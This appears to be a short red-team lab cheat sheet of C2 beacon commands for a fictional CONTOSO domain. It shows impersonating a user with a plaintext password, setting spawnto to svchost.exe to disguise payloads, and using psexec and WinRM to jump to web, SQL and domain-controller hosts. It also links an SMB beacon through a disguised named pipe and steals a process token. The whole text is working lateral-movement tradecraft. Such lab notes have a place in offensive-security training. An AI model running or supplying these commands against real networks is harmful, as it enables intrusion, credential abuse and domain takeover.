
Create logon session as local Admin
```powershell
make_token CONTOSO\rsteel Passw0rd!
```

Change the `spawnto` for the service payload
```powershell
ak-settings spawnto_x86 C:\Windows\SysWOW64\svchost.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

Jump via psexec64
```powershell
jump psexec64 DUB-WEB-1 smb

jump psexec64 DUB-WKSTN-2 smb

jump winrm64 DUB-WEB-1 smb

jump psexec64 DUB-SQL-1 smb

jump psexec64 LON-DC-1 smb
```

---

```powershell
link smb 192.168.110.52 dotnet-diagnostic-1337
```

```powershell
token-store steal 3184
token-store use 0 
```